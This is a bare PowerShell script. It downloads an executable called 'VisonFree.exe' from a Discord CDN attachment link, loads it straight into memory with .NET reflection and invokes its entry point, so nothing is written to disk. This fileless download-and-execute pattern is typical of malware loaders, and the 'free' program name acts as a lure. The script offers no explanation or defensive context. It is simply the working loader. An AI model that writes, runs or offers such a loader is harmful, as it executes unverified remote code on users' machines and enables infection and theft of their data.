$link = "https://cdn.discordapp.com/attachments/1453828966602506280/1493765878637006918/VisonFree.exe?ex=6a221462&is=6a20c2e2&hm=65f554a0268389ecb599e563f75fe1eb1bcb52ef004a64d747cc991b13b2deba&"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

if ($entry.GetParameters().Count -eq 1) {
    $entry.Invoke($null, @([string[]]@()))
} else {
    $entry.Invoke($null, $null)
}

Pause
